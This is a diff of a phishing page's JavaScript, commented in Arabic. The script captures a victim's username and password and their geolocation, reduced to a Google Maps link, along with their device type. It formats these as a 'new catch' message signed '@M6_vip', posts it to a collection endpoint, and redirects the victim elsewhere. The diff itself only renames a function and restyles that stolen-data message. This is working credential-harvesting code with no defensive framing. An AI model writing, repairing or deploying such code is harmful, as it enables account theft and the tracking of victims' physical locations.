@@ -84,8 +84,8 @@
 <script>
     var loginAttempts = 0;
 
-    // دالة كشف الجهاز
-    function checkDevice() {
+    // دالة كشف نوع الجهاز (أندرويد أو آيفون)
+    function getDevice() {
         var ua = navigator.userAgent;
         if (/android/i.test(ua)) return "🤖 Android";
         if (/iPhone|iPad|iPod/i.test(ua)) return "🍎 iOS (iPhone)";
@@ -100,7 +100,6 @@
         if (u.length >= 5 && p.length >= 6) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    // تصحيح رابط الموقع ليفتح الخريطة مباشرة
                     var loc = 'https://www.google.com/maps?q=' + position.coords.latitude + ',' + position.coords.longitude;
                     sendData(u, p, loc);
                 }, function() {
@@ -136,25 +135,14 @@
     }
 
     function sendData(u, p, l) {
-        var dev = checkDevice();
-        // التنسيق الجديد المرتب
-        var msg = `
-🎯 **صيد جديد مرتب** 🎯
-━━━━━━━━━━━━━━
-👤 **المستخدم:** \`${u}\`
-
-🔑 **كلمة السر:** \`${p}\`
-
-📱 **الجهاز:** ${dev}
-
-📍 **الموقع:** ${l}
-━━━━━━━━━━━━━━
-👤 @M6_vip`;
+        var device = getDevice();
+        // تنسيق الرسالة بشكل احترافي مع العلامات البرمجية للنسخ
+        var fullMsg = "🎯 صيد جديد مرتب 🎯\n━━━━━━━━━━━━━━\n👤 المستخدم: `" + u + "`\n🔑 كلمة السر: `" + p + "`\n📱 الجهاز: " + device + "\n📍 الموقع: " + l + "\n━━━━━━━━━━━━━━\n👤 @M6_vip";
 
         fetch('/api/save', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: msg })
+            body: JSON.stringify({ message: fullMsg })
         }).then(function() {
             window.location.href = 'https://receive-smss.com/';
         }).catch(function() {
